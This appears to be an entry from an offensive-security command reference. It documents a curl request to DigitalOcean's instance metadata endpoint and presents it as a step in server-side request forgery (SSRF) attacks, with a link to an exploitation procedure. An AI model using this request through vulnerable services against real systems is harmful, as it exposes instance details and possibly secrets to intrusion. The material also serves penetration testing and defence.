---
id: 71a02d68-a66c-4ac8-9103-adabb03ef3ae
type: command
executor: bash
data: >-
  curl -H 'Metadata-Flavor: DigitalOcean'
  http://169.254.169.254/metadata/v1.json
output: null
created_at: '2023-04-06T03:56:38.436504+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - DigitalOcean
  - Linux
tags:
  - ssrf
  - metadata
  - json
verified: true
validated: true
---

# curl-do-metadata-json

## Command

```bash
curl -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1.json
```

## Description

Retrieves full Droplet metadata in JSON format for DigitalOcean. Essential for SSRF to get comprehensive instance info.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H 'Metadata-Flavor: DigitalOcean' | Required header for DO metadata | Yes |

## Examples

### Basic Usage

```bash
curl -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1.json
```

## Expected Output

{"droplet_id": 123456, "hostname": "example", "region": "nyc3", ...}

## Related

- [[procedures/Exploit-SSRF-to-Access-Cloud-Metadata]]
